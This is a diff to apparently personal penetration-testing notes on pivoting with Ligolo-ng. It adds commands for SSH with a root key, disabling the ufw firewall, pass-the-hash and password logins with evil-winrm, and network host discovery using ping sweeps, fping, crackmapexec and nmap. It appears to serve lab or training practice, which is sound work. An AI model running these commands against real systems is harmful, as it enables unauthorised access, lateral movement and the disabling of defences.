@@ -1,6 +1,6 @@
 # Ligolo-ng
 
-## SSH Into TGT
+## SSH Into TGT or Connect via Evil-Winrm
 ```bash
 ssh -i ~/enterprise/keys/root_rsa USER@TGTIP
 
@@ -9,6 +9,13 @@ ssh -i ~/enterprise/keys/root_rsa root@10.129.229.147
 #Disable firewall if possible
 ## Linux
 sudo ufw disable
+
+#Windows with hash
+evil-winrm -i 172.16.139.3 -u Administrator -H NTLM HASH
+#Windows with Password
+evil-winrm -i 172.16.210.5 -u Administrator -p 'PASSWORD'
+#Windows with Password File
+evil-winrm -i 172.16.210.5 -u Administrator -P 'NAME OF FILE'
 ```
 
 ## Transfer Agent to TGT
@@ -78,7 +85,9 @@ start
 ## Find and add routes
 #### In ligolo
 ```bash
-    ifconfig
+ifconfig
+netstat -an
+ip route
 ```
 ![alt text](image.png)
 
@@ -101,4 +110,13 @@ listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:5555 --tcp
 listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp
 listener_add --addr 0.0.0.0:6000 --to 127.0.0.1:6000 --tcp
 ```
-
+## Find other hosts
+```bash
+for ip in $(seq 1 254); do ping -c1 -W1 172.16.139.$ip >/dev/null && echo "UP: 172.16.139.$ip"; done
+#or
+fping -a -g 172.16.0.0/16 2>/dev/null
+#or
+crackmapexec smb 172.16.0.0/16
+#or
+nmap scan
+```
